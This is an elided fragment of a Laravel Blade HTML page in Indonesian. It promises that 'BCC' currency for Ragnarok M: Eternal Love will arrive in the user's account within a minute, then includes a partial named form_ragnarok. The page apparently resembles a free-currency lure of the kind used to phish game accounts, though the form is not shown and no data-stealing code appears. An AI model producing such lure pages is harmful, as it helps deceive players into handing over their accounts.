...
<body>
    ...
    <div class="content-container">
        ...
        <img src="{{ asset('gambar6.png') }}" alt="Game" class="game-image">
        <h3 class="genshin-title">Ragnarok M: Eternal Love</h3>
        ...
        <h3 class="title7">Tunggu 1 menit BCC akan masuk otomatis ke akun Anda.</h3>
        <h3 class="title8">
            <span class="marquee">
    ...
    <div class="data-container">
        <h4 class="data-title">@include('form_ragnarok') </h4>
    </div> 
